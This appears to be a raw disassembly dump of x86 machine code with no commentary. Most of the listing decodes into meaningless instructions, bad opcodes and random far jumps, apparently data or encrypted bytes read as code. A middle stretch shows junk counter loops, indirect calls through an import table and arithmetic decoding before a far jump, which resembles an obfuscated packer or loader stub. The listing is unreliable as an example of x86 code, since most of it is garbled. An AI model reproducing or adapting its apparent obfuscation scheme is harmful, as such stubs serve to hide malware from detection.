  4130ea:	sbb    DWORD PTR [eax+0xa],0xffffff85
  4130ee:	jae    0x4130a6
  4130f0:	rcr    BYTE PTR [edi],cl
  4130f2:	aad    0x50
  4130f4:	sbb    eax,esp
  4130f6:	call   0x79695830
  4130fb:	cmp    dl,BYTE PTR ds:0x4802f0f6
  413101:	call   0xd03f:0x7097c45c
  413108:	test   ch,dl
  41310a:	hlt    
  41310b:	dec    esi
  41310c:	add    esi,DWORD PTR [ecx]
  41310e:	stos   DWORD PTR es:[edi],eax
  41310f:	mov    edx,DWORD PTR [ecx-0x234c82f8]
  413115:	mov    al,0xaf
  413117:	mov    dh,0x7b
  413119:	or     cl,bl
  41311b:	and    BYTE PTR [ebx],cl
  41311d:	jecxz  0x41310c
  41311f:	inc    eax
  413120:	outs   dx,DWORD PTR ds:[esi]
  413121:	push   ss
  413122:	gs ret 
  413124:	jmp    esi
  413126:	ret    
  413127:	addr16 adc esi,0x6aad288f
  41312e:	push   0x9544e6d8
  413133:	pop    ebx
  413134:	adc    bl,bl
  413136:	adc    ah,ch
  413138:	not    DWORD PTR [edx-0x72f28998]
  41313e:	ins    BYTE PTR es:[edi],dx
  41313f:	xor    al,0xb9
  413141:	inc    esp
  413142:	stos   DWORD PTR es:[edi],eax
  413143:	clc    
  413144:	add    DWORD PTR [edx+0x3d],esp
  413147:	inc    ebp
  413148:	dec    edx
  413149:	jecxz  0x4130ee
  41314b:	push   ss
  41314c:	repz mov bl,0xde
  41314f:	cmp    ch,BYTE PTR [ebx]
  413151:	push   es
  413152:	aas    
  413153:	std    
  413154:	jbe    0x4130d6
  413156:	and    BYTE PTR [esp],dl
  413159:	into   
  41315a:	inc    edx
  41315b:	rcl    BYTE PTR [ebp-0x58],0xc5
  41315f:	jmp    0x7167:0x9c4e6da7
  413166:	push   0xb335e7b6
  41316b:	mov    esi,0x8725a760
  413170:	mov    ecx,0x5f91f6b9
  413175:	das    
  413176:	pusha  
  413177:	bound  ebp,QWORD PTR [eax+edx*2-0xc]
  41317b:	dec    esi
  41317c:	mov    dl,0xf9
  41317e:	das    
  41317f:	pop    esp
  413180:	cmp    al,0xcc
  413182:	pop    ecx
  413183:	pop    eax
  413184:	pop    edx
  413185:	les    edi,FWORD PTR [edx+0x3b07128c]
  41318b:	(bad)  
  41318c:	adc    edx,DWORD PTR [ebp+0x31]
  41318f:	imul   ebp,ebp,0xffffffb8
  413192:	js     0x413209
  413194:	push   edx
  413195:	sbb    ebx,DWORD PTR [ebp+0x32]
  413198:	lea    edx,[edi]
  41319a:	bound  edi,QWORD PTR [eax]
  41319c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41319d:	adc    DWORD PTR [ebp+0x72d0dd75],edx
  4131a3:	or     al,ah
  4131a5:	out    0xa5,eax
  4131a7:	cli    
  4131a8:	and    bl,BYTE PTR [edi-0x34]
  4131ab:	mov    esp,0xcf5b1443
  4131b0:	ja     0x4131af
  4131b2:	mov    WORD PTR [eax+0x23],?
  4131b5:	je     0x4131d6
  4131b7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4131b8:	pop    ds
  4131b9:	jmp    0xd913:0xfd5f503b
  4131c0:	pop    ebp
  4131c1:	mov    ecx,0xa6aa4e87
  4131c6:	gs sbb cl,dh
  4131c9:	es lahf 
  4131cb:	(bad)  
  4131cc:	mov    ecx,0x6a6153f3
  4131d1:	(bad)  
  4131d2:	out    0xc2,eax
  4131d4:	inc    edx
  4131d5:	add    BYTE PTR [ebx],bl
  4131d7:	in     al,0xc3
  4131d9:	push   0xffffff97
  4131db:	pop    ecx
  4131dc:	inc    eax
  4131dd:	rol    DWORD PTR [eax-0x498eecda],cl
  4131e3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4131e4:	pop    ebx
  4131e5:	cmp    esi,DWORD PTR [ebx]
  4131e7:	sbb    dh,BYTE PTR [esi+0x1e]
  4131ea:	sub    DWORD PTR [edx+0x73d118f],ebx
  4131f0:	mov    eax,ds:0x25f52aa6
  4131f5:	stos   DWORD PTR es:[edi],eax
  4131f6:	sar    BYTE PTR [edi],0xa4
  4131f9:	mov    DWORD PTR [eax-0x2b317d5c],ebp
  4131ff:	lds    edx,FWORD PTR [ebx]
  413201:	or     al,0x24
  413203:	xor    eax,0x18da54f8
  413208:	xchg   edx,esi
  41320a:	adc    eax,0x49d42bf
  41320f:	xor    eax,0x47d3052
  413214:	adc    edx,ecx
  413216:	mov    bl,0x6b
  413218:	mov    ah,0xf4
  41321a:	jae    0x41325e
  41321c:	retf   0xf38e
  41321f:	aas    
  413220:	sub    dl,dl
  413222:	es xchg edx,eax
  413224:	cli    
  413225:	dec    ebx
  413226:	daa    
  413227:	jns    0x4131cc
  413229:	mov    WORD PTR ds:0x9b7fe6a8,fs
  41322f:	scas   al,BYTE PTR es:[edi]
  413230:	hlt    
  413231:	mov    edx,0x2b9c2cb2
  413236:	(bad)  
  413237:	fdiv   QWORD PTR [ecx+eax*8+0x3b29f347]
  41323e:	sub    eax,0x143a3ffa
  413243:	repz fsub st(2),st
  413246:	mov    cl,0x78
  413248:	les    esp,FWORD PTR [esi]
  41324a:	and    eax,0x47ae06f0
  41324f:	push   0xffffffc5
  413251:	mov    BYTE PTR [eax-0x4],bl
  413254:	loop   0x41325c
  413256:	lds    ebp,FWORD PTR ds:0x836b3a72
  41325c:	xchg   edx,eax
  41325d:	ds addr16 (bad) 
  413260:	fnsave [ecx+0x14]
  413263:	sub    BYTE PTR [edx+0xf281cb],bh
  413269:	enter  0x3102,0x99
  41326d:	push   edi
  41326e:	mov    ds:0xfbbcd39e,al
  413273:	lds    ecx,FWORD PTR [eax+ebp*1+0x2f]
  413277:	jmp    0x41325a
  413279:	stos   DWORD PTR es:[edi],eax
  41327a:	cwde   
  41327b:	dec    ebx
  41327c:	mov    ah,0x78
  41327e:	retf   0x5b61
  413281:	adc    ebp,esi
  413283:	push   es
  413284:	cmp    al,0xc1
  413286:	shr    BYTE PTR [edx+0x58b72dc8],1
  41328c:	out    dx,al
  41328d:	das    
  41328e:	jl     0x413221
  413290:	mov    cl,0xa9
  413292:	xchg   ebx,eax
  413293:	xchg   esi,eax
  413294:	xlat   BYTE PTR ds:[ebx]
  413295:	loope  0x413218
  413297:	xchg   edi,eax
  413298:	sub    DWORD PTR [ebp-0x43ad734e],ebx
  41329e:	pop    ss
  41329f:	mov    dh,0xba
  4132a1:	aam    0x3b
  4132a3:	jmp    0xc0faa5d7
  4132a8:	adc    al,0xa5
  4132aa:	(bad)  
  4132ab:	inc    esp
  4132ac:	inc    edi
  4132ad:	ds loop 0x41325d
  4132b0:	aaa    
  4132b1:	loopne 0x41331a
  4132b3:	add    BYTE PTR [esp+eiz*2+0x36591d99],0xf
  4132bb:	mov    ebx,0x40c9a30a
  4132c0:	jo     0x4132c3
  4132c2:	and    DWORD PTR [esi+eax*1+0x34],ecx
  4132c6:	loopne 0x4132b1
  4132c8:	and    al,0x50
  4132ca:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4132cb:	and    BYTE PTR [esi],ch
  4132cd:	xchg   ebx,eax
  4132ce:	push   es
  4132cf:	outs   dx,BYTE PTR ds:[esi]
  4132d0:	lahf   
  4132d1:	and    DWORD PTR [ebx+0x3c48ed2b],0xf887c7c7
  4132db:	add    eax,0x170b9ef9
  4132e0:	or     esp,esi
  4132e2:	mov    edx,0x86be31bd
  4132e7:	dec    ecx
  4132e8:	ins    DWORD PTR es:[edi],dx
  4132e9:	jp     0x413305
  4132eb:	jmp    0x39f2ebfd
  4132f0:	sub    DWORD PTR [edx+0x34b2ad05],ebp
  4132f6:	jmp    0x5c4:0x96a6cc42
  4132fd:	xchg   esi,eax
  4132fe:	stos   BYTE PTR es:[edi],al
  4132ff:	mov    bl,0xe5
  413301:	std    
  413302:	fild   QWORD PTR [edi]
  413304:	cmc    
  413305:	clc    
  413306:	mov    bl,0xc2
  413308:	loop   0x41337b
  41330a:	(bad)  
  41330b:	loop   0x41332f
  41330d:	hlt    
  41330e:	std    
  41330f:	inc    ecx
  413310:	sub    eax,0x8db50edb
  413315:	in     eax,dx
  413316:	xchg   ebp,eax
  413317:	sbb    al,0x4a
  413319:	jne    0x41334a
  41331b:	retf   
  41331c:	pop    ecx
  41331d:	cmp    BYTE PTR [ebx+eax*1+0x3d],cl
  413321:	cmp    BYTE PTR [edi+edx*8],al
  413324:	mov    ah,0xf5
  413326:	cmp    esp,esi
  413328:	and    eax,0x45afa416
  41332d:	rcr    BYTE PTR [ebx],1
  41332f:	aam    0xdf
  413331:	mov    esi,DWORD PTR [edx+0x72ce686e]
  413337:	aaa    
  413338:	sub    eax,0xd7a2a92f
  41333d:	mov    DWORD PTR [edx],ecx
  41333f:	mov    DWORD PTR ds:0x420e8e,0x16
  413349:	cmp    DWORD PTR ds:0x420e8e,0x0
  413350:	je     0x4133a5
  413356:	cmp    DWORD PTR ds:0x420e8e,0x2
  41335d:	jne    0x413373
  413363:	push   0x4d61
  413368:	push   0x424000
  41336d:	call   DWORD PTR ds:0x4247fd
  413373:	cmp    DWORD PTR ds:0x420e8e,0x3
  41337a:	jne    0x41338d
  413380:	mov    ecx,DWORD PTR ds:0x420e8e
  413386:	dec    ecx
  413387:	mov    DWORD PTR ds:0x420e8e,ecx
  41338d:	mov    ecx,DWORD PTR ds:0x420e8e
  413393:	dec    ecx
  413394:	mov    DWORD PTR ds:0x420e8e,ecx
  41339a:	jmp    0x413349
  41339f:	sbb    ecx,0x253c
  4133a5:	mov    ecx,DWORD PTR [ebp-0x14]
  4133a8:	and    DWORD PTR ds:0x42201c,0x420efc
  4133b2:	xor    ecx,eax
  4133b4:	adc    DWORD PTR ds:0x420f70,0x420ef8
  4133be:	add    ecx,esi
  4133c0:	mov    DWORD PTR [ebp-0x20],ecx
  4133c3:	mov    DWORD PTR [ebp+0x8],0xf89c85b5
  4133ca:	mov    ecx,DWORD PTR ds:0x420eec
  4133d0:	mov    DWORD PTR [ebp-0xc],0xf89c85a5
  4133d7:	mov    DWORD PTR [ebp-0x1c],0xf89c95b5
  4133de:	mov    ecx,0x748f
  4133e3:	mov    ecx,DWORD PTR [ebp-0xc]
  4133e6:	mov    DWORD PTR [ebp+0x8],ecx
  4133e9:	mov    DWORD PTR ds:0x420f68,0x5b27
  4133f3:	jmp    0x413647
  4133f8:	xor    DWORD PTR ds:0x422008,edx
  4133fe:	mov    ecx,DWORD PTR [ebp+0x8]
  413401:	sub    DWORD PTR ds:0x420fa8,0x420ef8
  41340b:	mov    edx,DWORD PTR [ebp-0x8]
  41340e:	sub    DWORD PTR ds:0x420e86,0x420f98
  413418:	xor    ecx,eax
  41341a:	sbb    DWORD PTR ds:0x420f60,0x61d9
  413424:	xor    edx,eax
  413426:	xor    DWORD PTR ds:0x420f04,0x2d2e
  413430:	sub    ecx,edx
  413432:	sub    ecx,esi
  413434:	xor    ecx,eax
  413436:	and    DWORD PTR ds:0x420e9e,0x0
  413440:	mov    edx,DWORD PTR ds:0x420e9e
  413446:	inc    edx
  413447:	mov    DWORD PTR ds:0x420e9e,edx
  41344d:	cmp    DWORD PTR ds:0x420e9e,0x5
  413454:	jne    0x41346d
  41345a:	push   0x4241e6
  41345f:	push   0x1
  413461:	push   DWORD PTR [ebp-0x10]
  413464:	push   DWORD PTR [ebp-0x28]
  413467:	call   DWORD PTR ds:0x424801
  41346d:	cmp    DWORD PTR ds:0x420e9e,0x4
  413474:	jne    0x413487
  41347a:	mov    edx,DWORD PTR ds:0x420e9e
  413480:	inc    edx
  413481:	mov    DWORD PTR ds:0x420e9e,edx
  413487:	cmp    DWORD PTR ds:0x420e9e,0x18
  41348e:	jb     0x413440
  413494:	mov    DWORD PTR [ebp+0x8],ecx
  413497:	dec    edx
  413498:	mov    ecx,DWORD PTR [ebp+0x8]
  41349b:	add    edx,DWORD PTR ds:0x420e92
  4134a1:	mov    edx,DWORD PTR [ebp-0x64]
  4134a4:	add    DWORD PTR ds:0x420fa8,0x502e
  4134ae:	lea    ecx,[edx+ecx*1+0x5708f2]
  4134b5:	and    DWORD PTR ds:0x420f64,0x0
  4134bf:	mov    edx,DWORD PTR ds:0x420f64
  4134c5:	inc    edx
  4134c6:	mov    DWORD PTR ds:0x420f64,edx
  4134cc:	cmp    DWORD PTR ds:0x420f64,0x1a
  4134d3:	jne    0x4134e7
  4134d9:	push   0x420f04
  4134de:	push   DWORD PTR [ebp-0x24]
  4134e1:	call   DWORD PTR ds:0x424805
  4134e7:	cmp    DWORD PTR ds:0x420f64,0x15
  4134ee:	jb     0x4134bf
  4134f4:	or     DWORD PTR ds:0x422008,0x1488
  4134fe:	mov    DWORD PTR [ebp-0x64],ecx
  413501:	mov    ecx,DWORD PTR [ebp+0x8]
  413504:	mov    edx,DWORD PTR [ebp-0x60]
  413507:	lea    ecx,[edx+ecx*1+0x5708f2]
  41350e:	mov    DWORD PTR [ebp-0x60],ecx
  413511:	mov    ecx,DWORD PTR [ebp+0x8]
  413514:	mov    edx,DWORD PTR ds:0x422000
  41351a:	adc    DWORD PTR ds:0x420fa4,edx
  413520:	mov    edx,DWORD PTR [ebp-0x5c]
  413523:	sbb    DWORD PTR ds:0x420fa4,0x6605
  41352d:	lea    ecx,[edx+ecx*1+0x5708f3]
  413534:	and    DWORD PTR ds:0x420f5c,0x0
  41353e:	jmp    0x413552
  413543:	xor    edx,edx
  413545:	xor    edx,DWORD PTR ds:0x420f5c
  41354b:	inc    edx
  41354c:	mov    DWORD PTR ds:0x420f5c,edx
  413552:	cmp    DWORD PTR ds:0x420f5c,0x13
  413559:	jae    0x4135ab
  41355f:	cmp    DWORD PTR ds:0x420f5c,0x5
  413566:	jne    0x41358a
  41356c:	push   DWORD PTR [ebp-0x20]
  41356f:	push   0x420f04
  413574:	push   DWORD PTR [ebp-0x20]
  413577:	push   0x4240b9
  41357c:	push   0x1238
  413581:	push   DWORD PTR [ebp-0xc]
  413584:	call   DWORD PTR ds:0x42480d
  41358a:	cmp    DWORD PTR ds:0x420f5c,0x4
  413591:	jne    0x4135a4
  413597:	mov    edx,DWORD PTR ds:0x420f5c
  41359d:	inc    edx
  41359e:	mov    DWORD PTR ds:0x420f5c,edx
  4135a4:	jmp    0x413543
  4135a9:	neg    edx
  4135ab:	mov    DWORD PTR [ebp-0x5c],ecx
  4135ae:	and    DWORD PTR ds:0x420fa4,0x0
  4135b8:	mov    edx,DWORD PTR ds:0x420fa4
  4135be:	inc    edx
  4135bf:	mov    DWORD PTR ds:0x420fa4,edx
  4135c5:	cmp    DWORD PTR ds:0x420fa4,0x20
  4135cc:	jne    0x4135d8
  4135d2:	call   DWORD PTR ds:0x424811
  4135d8:	cmp    DWORD PTR ds:0x420fa4,0x18
  4135df:	jb     0x4135b8
  4135e5:	adc    edx,0x1b19
  4135eb:	mov    ecx,DWORD PTR [ebp+0x8]
  4135ee:	mov    edx,DWORD PTR [ebp-0x58]
  4135f1:	lea    ecx,[edx+ecx*1+0x5708f0]
  4135f8:	xor    edx,DWORD PTR ds:0x420f08
  4135fe:	mov    DWORD PTR [ebp-0x58],ecx
  413601:	mov    ecx,DWORD PTR [ebp+0x8]
  413604:	xor    DWORD PTR ds:0x420f64,0x420eec
  41360e:	mov    edx,DWORD PTR [ebp-0x54]
  413611:	lea    ecx,[edx+ecx*1+0x5708f1]
  413618:	add    DWORD PTR ds:0x420f08,ebx
  41361e:	mov    DWORD PTR [ebp-0x54],ecx
  413621:	or     ecx,DWORD PTR ds:0x422018
  413627:	mov    ecx,DWORD PTR [ebp+0x8]
  41362a:	mov    edx,DWORD PTR [ebp-0x50]
  41362d:	inc    DWORD PTR ds:0x420f00
  413633:	lea    ecx,[edx+ecx*1+0x5708fe]
  41363a:	and    DWORD PTR ds:0x420e9a,0x420f6c
  413644:	mov    DWORD PTR [ebp-0x50],ecx
  413647:	inc    ecx
  413648:	mov    ecx,DWORD PTR [ebp+0x8]
  41364b:	adc    DWORD PTR ds:0x420ea2,0x68a
  413655:	xor    ecx,eax
  413657:	and    DWORD PTR ds:0x420e8e,0x1a66
  413661:	add    ecx,esi
  413663:	mov    DWORD PTR ds:0x420e92,0x4bef
  41366d:	jne    0x4133f8
  413673:	jmp    0x420dd1
  413678:	mov    ecx,DWORD PTR [ebp-0x1c]
  41367b:	mov    edx,DWORD PTR ds:0x423008
  413681:	mov    edx,DWORD PTR [edx]
  413683:	sub    DWORD PTR ds:0x420fb4,edx
  413689:	mov    edx,DWORD PTR [ebp-0x8]
  41368c:	xor    DWORD PTR ds:0x420f04,0x3196
  413696:	xor    ecx,eax
  413698:	xor    edx,eax
  41369a:	sbb    DWORD PTR ds:0x422000,0x24d3
  4136a4:	sub    ecx,edx
  4136a6:	xor    DWORD PTR ds:0x420e82,0x420e8a
  4136b0:	sub    ecx,esi
  4136b2:	xor    ecx,eax
  4136b4:	mov    DWORD PTR [ebp-0x1c],ecx
  4136b7:	mov    ecx,DWORD PTR [ebp-0xc]
  4136ba:	mov    DWORD PTR [ebp+0x8],ecx
  4136bd:	jmp    0x4136ef
  4136c2:	mov    ecx,DWORD PTR [ebp+0x8]
  4136c5:	mov    edx,DWORD PTR [ebp-0x8]
  4136c8:	xor    ecx,eax
  4136ca:	xor    edx,eax
  4136cc:	sub    ecx,edx
  4136ce:	sub    ecx,esi
  4136d0:	xor    ecx,eax
  4136d2:	mov    DWORD PTR [ebp+0x8],ecx
  4136d5:	mov    ecx,DWORD PTR [ebp+0x8]
  4136d8:	mov    edx,DWORD PTR [ebp+0x8]
  4136db:	imul   edx,edx,0x5708f2
  4136e1:	xor    ecx,eax
  4136e3:	add    ecx,esi
  4136e5:	lea    ecx,[ebp+ecx*4-0x64]
  4136e9:	mov    edi,DWORD PTR [ecx]
  4136eb:	add    edx,edi
  4136ed:	mov    DWORD PTR [ecx],edx
  4136ef:	mov    ecx,DWORD PTR [ebp+0x8]
  4136f2:	xor    ecx,eax
  4136f4:	jmp    0x415a81
  4136f9:	js     0x4136a4
  4136fb:	inc    edx
  4136fc:	iret   
  4136fd:	aaa    
  4136fe:	jae    0x41377b
  413700:	test   eax,0x7e5a8e7d
  413705:	loope  0x41373f
  413707:	add    bl,BYTE PTR [eax-0x42]
  41370a:	jae    0x413786
  41370c:	jp     0x413718
  41370e:	pop    edi
  41370f:	jp     0x41378b
  413711:	sbb    ch,BYTE PTR ds:0xfb7ae19
  413717:	imul   edx,DWORD PTR [edi-0x3e],0x2b
  41371b:	inc    edx
  41371c:	sub    al,0xba
  41371e:	mov    BYTE PTR [edi],cl
  413720:	cwde   
  413721:	(bad)
  413724:	arpl   WORD PTR [eax+0x54],di
  413727:	ret    
  413728:	pop    ebx
  413729:	push   0xffffff88
  41372b:	es sbb DWORD PTR ss:[edi+0x3e],ebx
  413730:	xor    eax,0xec1540b7
  413735:	fs mov bl,0xdd
  413738:	cmp    eax,0x871e01d2
  41373d:	rol    DWORD PTR [eax-0x6ddad735],1
  413743:	(bad)  
  413744:	push   0xf5befc06
  413749:	inc    ecx
  41374a:	std    
  41374b:	aam    0x50
  41374d:	adc    eax,0x11b2342
  413752:	pop    edi
  413753:	retf   0xc493
  413756:	popa   
  413757:	jecxz  0x41371d
  413759:	sbb    al,0xf1
  41375b:	int3   
  41375c:	pushf  
  41375d:	jge    0x4136fe
  41375f:	dec    ecx
  413760:	ins    BYTE PTR es:[edi],dx
  413761:	ss shr eax,1
  413764:	stos   BYTE PTR es:[edi],al
  413765:	mov    BYTE PTR [edx],al
  413767:	mov    esi,DWORD PTR [ebx-0x3b]
  41376a:	pop    eax
  41376b:	out    0x21,eax
  41376d:	into   
  41376e:	aad    0x5
  413770:	mov    cl,0x1a
  413772:	mov    eax,ds:0xce8886b5
  413777:	fwait
  413778:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413779:	pop    es
  41377a:	sbb    eax,0x59e4c7ec
  41377f:	shl    DWORD PTR [edx+0x20],0x69
  413783:	enter  0x7966,0xd
  413787:	aas    
  413788:	pop    ecx
  413789:	test   DWORD PTR [ecx+0x74],0x34a456d2
  413790:	push   cs
  413791:	imul   esi,DWORD PTR [edi-0x1b],0x40
  413795:	sub    al,0x86
  413797:	sbb    DWORD PTR [edx+0x734d2829],ebx
  41379d:	add    al,0xe2
  41379f:	jecxz  0x41374e
  4137a1:	push   0x6c82cedb
  4137a6:	jmp    0x413827
  4137a8:	cmp    BYTE PTR [esi+0x42],bl
  4137ab:	aaa    
  4137ac:	jle    0x413783
  4137ae:	test   DWORD PTR [ebx+edi*1],edx
  4137b1:	or     dh,dh
  4137b3:	sbb    eax,0x15bedfbb
  4137b8:	fld    TBYTE PTR [ebp-0x15]
  4137bb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4137bc:	div    BYTE PTR [ebx-0x7d693b88]
  4137c2:	mov    fs,esi
  4137c4:	sbb    edx,DWORD PTR [edx]
  4137c6:	and    DWORD PTR [edx+0xe2f1b9b],edi
  4137cc:	push   edi
  4137cd:	adc    bh,BYTE PTR [ecx+ebp*4+0x554ec180]
  4137d4:	enter  0xbb14,0xdb
  4137d8:	add    edi,DWORD PTR [esi+0x40]
  4137db:	push   eax
  4137dc:	mov    WORD PTR [esi+0x4e],ds
  4137df:	sbb    eax,0xbc9de9a
  4137e4:	push   es
  4137e5:	and    al,0xb5
  4137e7:	push   0x1c
  4137e9:	pop    ds
  4137ea:	out    dx,eax
  4137eb:	mov    ecx,0x2fa17492
  4137f0:	mov    esi,0x1084a32
  4137f5:	dec    eax
  4137f6:	xchg   esi,eax
  4137f7:	mov    al,0x53
  4137f9:	clc    
  4137fa:	pop    edi
  4137fb:	sbb    edi,DWORD PTR [edi+0x8]
  4137fe:	imul   edi,DWORD PTR [edx+0x4d7b6b85],0xffffff86
  413805:	pop    edi
  413806:	cmp    DWORD PTR [esi+0xb],ebx
  413809:	sbb    DWORD PTR [edi],ebx
  41380b:	cmp    BYTE PTR [esi],0xce
  41380e:	retf   
  41380f:	jmp    0x2cdbd82a
  413814:	push   edx
  413815:	sbb    ebp,DWORD PTR [edx+0x55]
  413818:	or     eax,0x1d9d9af5
  41381d:	lea    esi,[ecx]
  41381f:	sub    BYTE PTR ds:0xf28af73f,bh
  413825:	cmp    BYTE PTR [ebp+0x13c826c4],bl
  41382b:	repnz popa 
  41382d:	cmc    
  41382e:	repz push eax
  413830:	ins    DWORD PTR es:[edi],dx
  413831:	adc    BYTE PTR [eax-0x30e6ad3e],bh
  413837:	cmp    BYTE PTR [edi],bh
  413839:	add    BYTE PTR [ecx],bh
  41383b:	adc    dh,ah
  41383d:	out    0xef,al
  41383f:	or     ecx,DWORD PTR [ecx+0x6b2e43fc]
  413845:	loop   0x4137ce
  413847:	jp     0x4137ea
  413849:	arpl   di,dx
  41384b:	dec    edi
  41384c:	sbb    esp,DWORD PTR [ebx+0x64]
  41384f:	push   ds
  413850:	or     eax,0x711f5163
  413855:	and    al,0x54
  413857:	pop    eax
  413858:	jb     0x413810
  41385a:	and    BYTE PTR [esi+0x2f4be4d8],cl
  413860:	leave  
  413861:	push   0xfffffff0
  413863:	daa    
  413864:	call   0x1846:0xb60809e6
  41386b:	fst    DWORD PTR [ebx]
  41386d:	pushf  
  41386e:	mov    ebp,0xc6ec8ab6
  413873:	cmp    dh,BYTE PTR [ebx+0x702394ec]
  413879:	inc    eax
  41387a:	adc    al,0xe5
  41387c:	sub    al,0x67
  41387e:	out    dx,al
  41387f:	pusha  
  413880:	xchg   ecx,eax
  413881:	push   edx
  413882:	jb     0x4138a6
  413884:	mov    WORD PTR [edx+eiz*8+0x3d1a7823],es
  41388b:	xor    ebp,DWORD PTR [edi-0x9]
  41388e:	imul   ecx
  413890:	xchg   edi,eax
  413891:	and    DWORD PTR [ebp-0x22],ebx
  413894:	mov    dh,0x93
  413896:	retf   0xedc9
  413899:	mov    ch,0xa1
  41389b:	pop    esp
  41389c:	pop    eax
  41389d:	cdq    
  41389e:	fnstcw WORD PTR [esi]
  4138a0:	aas    
  4138a1:	sbb    DWORD PTR [edx],eax
  4138a3:	cmp    al,0xca
  4138a5:	xor    al,0x6d
  4138a7:	out    0x70,eax
  4138a9:	hlt    
  4138aa:	and    dl,BYTE PTR [edx-0xfff3297]
  4138b0:	sbb    cl,BYTE PTR [edi+ebp*4]
  4138b3:	mov    ch,0x28
  4138b5:	in     al,dx
  4138b6:	mov    ch,0x6b
  4138b8:	inc    esi
  4138b9:	mov    edx,0x2b6c155b
  4138be:	pop    esp
  4138bf:	adc    ch,BYTE PTR [esi+0x728f10ab]
  4138c5:	cmp    ebp,ecx
  4138c7:	mov    al,0xf4
  4138c9:	pop    edi
  4138ca:	outs   dx,BYTE PTR ds:[esi]
  4138cb:	out    0xb6,eax
  4138cd:	pop    esp
  4138ce:	sahf   
  4138cf:	cwde   
  4138d0:	adc    DWORD PTR [eax+ebp*2-0x50395ba3],eax
  4138d7:	test   BYTE PTR [edx-0x63],dh
  4138da:	mov    al,0x9f
  4138dc:	imul   ebp,DWORD PTR [ebx],0xffffffa4
  4138df:	popf   
  4138e0:	aaa    
  4138e1:	scas   eax,DWORD PTR es:[edi]
  4138e2:	dec    ebp
  4138e3:	mov    ebx,DWORD PTR [esi+0x44]
  4138e6:	icebp  
  4138e7:	cmp    ecx,DWORD PTR [ecx]
  4138e9:	mov    gs,WORD PTR [edi+0x5c]
  4138ec:	dec    edi
  4138ed:	mov    ?,WORD PTR [ebp+0x1b]
  4138f0:	fs xchg ecx,eax
  4138f2:	add    al,0x40
  4138f4:	adc    al,0x82
  4138f6:	jo     0x41396a
  4138f8:	jg     0x413896
  4138fa:	out    0xd8,eax
  4138fc:	mov    edx,0xe1c6bad0
  413901:	dec    edi
  413902:	mov    ?,WORD PTR [esi+0x4d]
  413905:	jge    0x4138c7
  413907:	daa    
  413908:	(bad)  
  413909:	inc    ebp
  41390a:	mov    dh,0x66
  41390c:	jno    0x41389f
  41390e:	pop    ecx
  41390f:	outs   dx,BYTE PTR ds:[esi]
  413910:	sbb    eax,0xc4c3ed8c
  413915:	sub    al,0x7d
  413917:	dec    ecx
  413918:	mov    al,ds:0x910696cc
  41391d:	push   es
  41391e:	int    0x8c
  413920:	and    eax,0x430ca932
  413925:	stc    
  413926:	retf   
  413927:	pop    ecx
  413928:	and    al,0xc6
  41392b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41392c:	int3   
  41392d:	xor    ah,BYTE PTR [bx+0x3233]
  413932:	sbb    DWORD PTR [eax],edi
  413934:	outs   dx,BYTE PTR ds:[esi]
  413935:	sbb    DWORD PTR [eax],edx
  413937:	retf   
  413938:	outs   dx,BYTE PTR ds:[esi]
  413939:	int3   
  41393a:	sub    BYTE PTR [ecx],dh
  41393c:	mov    ?,WORD PTR [edx]
  41393e:	jle    0x41391b
  413940:	fiadd  WORD PTR [ecx+0x10]
  413943:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413944:	(bad)  
  413946:	mov    ds:0x646d3274,al
  41394b:	outs   dx,DWORD PTR ds:[esi]
  41394c:	std    
  41394d:	pop    ebp
  41394e:	ja     0x4139cb
  413950:	jno    0x41399c
  413952:	jns    0x4139be
  413954:	or     BYTE PTR [ebx],ch
  413956:	pop    es
  413957:	sar    DWORD PTR [ebp+0x2d7334b7],1
  41395d:	shl    BYTE PTR [esi-0x4b7a183a],0xd1
  413964:	mov    DWORD PTR [edx],ebx
  413966:	leave  
  413967:	test   al,0xcd
  413969:	shl    DWORD PTR [eax+0x6f4a23b7],1
  41396f:	retf   0x85c3
  413972:	jle    0x4139c4
  413974:	dec    ebp
  413975:	(bad)  
  413976:	cli    
  413977:	push   ss
  413978:	out    0x15,al
  41397a:	lea    ebp,[edi]
  41397c:	call   0xdf23c5bb
  413981:	mov    eax,DWORD PTR [esi+ecx*1]
  413984:	(bad)  
  413986:	int    0x6a
  413988:	lods   eax,DWORD PTR ds:[esi]
  413989:	pop    edi
  41398a:	mov    edx,DWORD PTR [eax+eax*4+0x32]
  41398e:	std    
  41398f:	adc    dl,BYTE PTR [esi-0x6b6df01a]
  413995:	mov    al,0x4b
  413997:	adc    al,BYTE PTR ds:0x5fb0a702
  41399d:	out    dx,eax
  41399e:	pop    ebp
  41399f:	sti    
  4139a0:	in     eax,dx
  4139a1:	aad    0x9b
  4139a3:	fsub   st,st(3)
  4139a5:	data16 js 0x4139c5
  4139a8:	sar    BYTE PTR [ebx-0x265bd6ad],0x2f
  4139af:	jae    0x413a11
  4139b1:	(bad)  
  4139b2:	jmp    DWORD PTR [edi+0x462e4eb3]
  4139b8:	push   es
  4139b9:	aam    0xa6
  4139bb:	mov    edx,0x68638d1f
  4139c0:	mov    edx,0xca0bff16
  4139c5:	addr16 out 0x9,eax
  4139c8:	jecxz  0x4139a5
  4139ca:	cmp    al,0x9a
  4139cc:	jmp    0xfeeb:0x7c38f149
  4139d3:	xchg   edi,eax
  4139d4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4139d5:	loopne 0x4139b3
  4139d7:	push   cs
  4139d8:	sub    BYTE PTR [ecx-0x3c4b1374],ah
  4139de:	retf   
  4139df:	adc    dh,BYTE PTR [eax-0x3e800c78]
  4139e5:	xor    al,0xba
  4139e7:	into   
  4139e8:	cmp    eax,DWORD PTR [edi-0x68]
  4139eb:	dec    ebx
  4139ec:	pop    ebx
  4139ed:	cmp    al,0x4a
  4139ef:	out    0x38,al
  4139f1:	dec    esi
  4139f2:	out    dx,eax
  4139f3:	push   edx
  4139f4:	or     eax,0xab043da3
  4139f9:	xor    edi,esi
  4139fb:	jmp    0x51b:0xb22291a8
  413a02:	fmul   DWORD PTR [esi]
  413a04:	outs   dx,BYTE PTR ds:[esi]
